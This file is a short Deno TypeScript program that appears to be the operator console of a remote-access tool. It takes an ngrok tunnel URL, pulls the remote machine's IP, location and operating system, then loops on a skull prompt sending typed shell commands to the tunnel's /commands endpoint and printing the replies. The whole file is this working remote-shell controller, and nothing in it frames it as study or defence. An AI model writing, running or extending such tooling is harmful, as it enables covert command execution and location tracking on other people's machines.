import * as ink from "https://deno.land/x/ink/mod.ts";

console.log("type a url like this: https://026f-181-58-226-188.ngrok.io")
const text = Deno.readTextFile("welcome.txt");
text.then((response) => console.log(response));
console.log("version 0.0.1")
console.log("Type ctrl + c to exit")
const url: string | null = prompt("enter the ngrok url:")!;
if (!url || url.length === 0) {
  console.log("put the url!");
} else {
  const getIp = await fetch(`${url}/ip`, { method: "GET" });
  const ip = await getIp.json();

  const getOs = await fetch(`${url}/ip/os`, { method: "GET" });
  const os = await getOs.text();
  // Print the info

  console.log(ink.colorize("<blue>       connection info            </blue>"));
  console.log(ink.colorize(`<yellow>       os: ${os}                  </yellow>`));
  console.log(ink.colorize(`<magenta>       ip: ${ip.query}            </magenta>`));
  console.log(ink.colorize(`<green>       country: ${ip.country}     </green>`));
  console.log(ink.colorize(`<cyan>       city: ${ip.city}             </cyan>`));

  while (true) {
    const input = prompt("💀>");

    // https://db10-181-58-226-188.ngrok.io
    const rawResponse = await fetch(`${url}/commands`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        command: input,
      }),
    });
    const content = await rawResponse.json();
    console.log(content);
  }
}
